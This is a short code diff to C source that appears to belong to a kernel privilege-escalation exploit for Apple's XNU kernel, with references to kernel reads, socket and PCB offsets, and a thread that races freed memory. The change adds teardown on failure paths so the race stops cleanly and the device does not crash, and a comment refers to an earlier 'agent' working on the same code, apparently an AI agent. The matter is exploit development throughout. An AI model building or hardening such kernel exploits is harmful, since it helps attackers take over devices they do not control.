@@ -265,13 +265,31 @@ kern_return_t pe(void) {
         LabOff()->tag, LUMINA_INPCB_SOCKET, LUMINA_INPCB_ICMP6FILT, LUMINA_SOCKET_USECOUNT);
     LOG("cluster_*_contig EINVAL unless UPL_PHYS_CONTIG (26.1). Q0!=marker is NOT kread.");
     pe_init();
-    pe_v1();
+    // V25.4: single pe_v1() call site (moved below, with bounded teardown)
+
+    // V25.4: bounded — no unbounded loops left behind on any exit
+    kern_return_t pe_v1_ret = pe_v1();
+    if (pe_v1_ret != KERN_SUCCESS) {
+        // teardown for the non-taken path is handled inside pe()'s failure
+        // branch and above; free_thread only leaks if pe_v1 bailed without
+        // reaching pe()'s verdict — stop it here too.
+        atomic_store_explicit(&g_ctx.shared->go_sync, 0, memory_order_seq_cst);
+        pthread_join(g_ctx.free_thread, NULL);
+        return pe_v1_ret;
+    }
 
     LOG("highiest_success_idx: %llu", g_ctx.highiest_success_idx);
     LOG("success_read_count: %llu", g_ctx.success_read_count);
 
     if (cs_expired() || g_ctx.control_socket == 0 || g_ctx.rw_socket == 0) {
         LOG_ERR("no control/rw socket pair — PCB hunt did not land this run");
+        // V25.4 TEARDOWN FIX: the old agent's P027 "delayed teardown death" is
+        // this — the failed path returned while go_sync stayed 1, so the free
+        // thread + socket churn kept racing the VM forever behind live UI
+        // (CF pool corruption → the 18:34 CFTypeCollectionRetain SIGTRAP, and
+        // the 17:51 bug_type 509 hang). Stop + join on EVERY exit path.
+        atomic_store_explicit(&g_ctx.shared->go_sync, 0, memory_order_seq_cst);
+        pthread_join(g_ctx.free_thread, NULL);
         return KERN_FAILURE;
     }
 
